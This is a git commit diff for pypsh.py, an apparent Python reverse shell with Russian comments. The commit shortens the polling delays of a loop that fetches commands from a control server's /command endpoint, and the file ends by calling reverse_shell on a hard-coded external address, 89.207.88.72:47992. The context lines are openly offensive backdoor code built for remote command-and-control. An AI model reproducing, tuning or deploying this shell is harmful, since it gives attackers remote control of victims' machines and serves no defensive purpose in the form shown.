dde6452f12b27d690ad155e5b1a606ce90a0eda3
DoctorANDRE333 <66256032+DoctorANDRE333@users.noreply.github.com>
2024-12-05 02:01:07 +0300

    Add files via upload

--- pypsh.py
+++ pypsh.py
@@ -9,13 +9,13 @@ def reverse_shell(server_url):
             # Запрашиваем следующую команду с управляющего сервера
             response = requests.get(f"{server_url}/command")
             if response.status_code != 200:
-                time.sleep(5)
+                time.sleep(3)
                 continue
 
             command = response.text.strip()
             if not command:
                 # Если команды нет, подождём перед следующим запросом
-                time.sleep(2)
+                time.sleep(1)
                 continue
 
             # Проверяем команду на завершение работы
@@ -46,7 +46,7 @@ def reverse_shell(server_url):
             except:
                 pass
             # Ждём перед повтором
-            time.sleep(5)
+            time.sleep(3)
 
 # Укажите URL вашего управляющего сервера
 reverse_shell("http://89.207.88.72:47992")
